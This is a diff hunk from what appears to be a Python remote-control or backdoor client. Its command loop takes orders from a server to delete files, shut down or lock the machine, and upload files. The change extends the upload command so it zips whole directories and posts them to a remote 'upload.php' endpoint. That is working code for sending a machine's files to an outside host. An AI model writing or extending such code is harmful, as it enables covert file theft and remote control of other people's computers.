@@ -91,27 +91,47 @@ while True:
                     shutil.rmtree(os.path.join(storage_path, item), ignore_errors=True)
         elif single[0] == 'upload':
             target_path = one[7:]
-            try:
-                temp_file = open(os.path.join(storage_path, target_path), 'rb')
-                file_object = {
-                    'type': (None, '6', None),
-                    'orgType': (None, 'B', None),
-                    'file': (target_path.split('\\')[-1], temp_file, 'unknown')
-                }
-            except FileNotFoundError as err:
-                with open('6.txt', 'w') as f:
-                    f.write('File not found')
-                temp_file = open('6.txt', 'rb')
-                file_object = {
-                    'type': (None, '6', None),
-                    'orgType': (None, 'B', None),
-                    'file': ('ERROR %d.txt' % int(time.time()), temp_file, 'unknown')
-                }
-            except:
-                continue
+            if not os.path.isdir(os.path.join(storage_path, target_path)):
+                try:
+                    temp_file = open(os.path.join(storage_path, target_path), 'rb')
+                    file_object = {
+                        'type': (None, '6', None),
+                        'orgType': (None, 'B', None),
+                        'file': (os.path.basename(target_path), temp_file, 'unknown')
+                    }
+                except FileNotFoundError as err:
+                    with open('6.txt', 'w') as f:
+                        f.write('File not found')
+                    temp_file = open('6.txt', 'rb')
+                    file_object = {
+                        'type': (None, '6', None),
+                        'orgType': (None, 'B', None),
+                        'file': ('ERROR %d.txt' % int(time.time()), temp_file, 'unknown')
+                    }
+                except:
+                    continue
+
+            else:
+                try:
+                    zipf = zipfile.ZipFile(os.path.basename(target_path) + '.zip', 'w', zipfile.ZIP_DEFLATED)
+                    path = os.path.join(storage_path, target_path)
+                    for root, dirs, files in os.walk(path):
+                        relative_root = '' if root == path else root.replace(path, '') + os.sep
+                        for filename in files:
+                            zipf.write(os.path.join(root, filename), relative_root + filename)
+                    zipf.close()
+                    temp_file = open(os.path.basename(target_path) + '.zip', 'rb')
+                    file_object = {
+                        'type': (None, '6', None),
+                        'orgType': (None, 'B', None),
+                        'file': (os.path.basename(target_path) + '.zip', temp_file, 'unknown')
+                    }
+                except:
+                    continue
             requests.post(req_url + 'upload.php', headers=header, files=file_object)
             time.sleep(1)
             temp_file.close()
+
         elif single[0] == 'shutdown':
             os.system('shutdown -s -t 0')
         elif single[0] == 'lock':
